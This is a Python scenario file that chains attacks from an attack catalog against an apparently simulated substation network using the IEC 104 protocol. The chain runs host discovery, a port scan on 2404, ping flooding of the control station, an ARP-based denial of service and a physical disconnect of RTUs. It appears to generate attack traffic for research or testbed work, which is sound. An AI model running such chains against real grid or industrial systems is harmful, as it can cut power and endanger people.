from attacks.attack import Attack
from attacks.catalog.DoS.ping_flooding import PingFlooding
from attacks.catalog.IEC_104.arp_dos import IEC104_ARP_dos
from attacks.catalog.physical.RTU_disconnect import PhysicalFaultRTU
from attacks.catalog.reconnaissance.host_discovery import HostDiscovery
from attacks.catalog.reconnaissance.port_scan import PortScan


class Disrupt_Communication_Attackchain:
    def __init__(self, project_name: str, project_path: str) -> None:
        self.project_name = project_name
        self.project_path = project_path
        self.attacks: list[Attack] = []

    def get_attack_list(self):

        # adversary wants to disrupt communication in the network with different methods. First aim, disruption of all communicatoin, then on subsation basis, no stealth
        # access to RTU in a substation n848
        # host discovery across the subnets
        # scan all of these targets for IEC104, so only port 2404
        # DOS MTU
        # Drop all communication between mtu and another substation
        # Physical Disconnect of accessed substation devices
        self.attacks.append(
            HostDiscovery(
                subnet="172.16.0-4.0-255",
                executing_host="n533",
                project_path=self.project_path,
                pause_duration=120,
            )
        )

        self.attacks.append(
            PortScan(
                target="172.16.1.1-2 172.16.3.1-29 172.16.2.1-6",
                executing_host="n533",
                ports="-p 2404",
                project_path=self.project_path,
                pause_duration=120,
            )
        )

        self.attacks.append(
            PingFlooding(
                target="172.16.1.2",
                executing_host="n533",
                attack_duration=180,
                pause_duration=120,
            )
        )

        self.attacks.append(
            IEC104_ARP_dos(
                executing_host="n533",
                project_path=self.project_path,
                attack_duration=180,
                pause_duration=120,
                ownip="172.16.3.4",
                targetsip="172.16.3.5,172.16.3.6,172.16.3.7,172.16.3.8",
                gatewaysip="172.16.3.28,172.16.3.29",
                gatewaysmac="02:c8:99:68:00:04,02:c8:99:68:00:05",
                mtuip="172.16.1.2",
            )
        )

        self.attacks.append(
            PhysicalFaultRTU(
                target="n491,n507,n520,n533", attack_duration=180, pause_duration=120
            )
        )

        return self.attacks
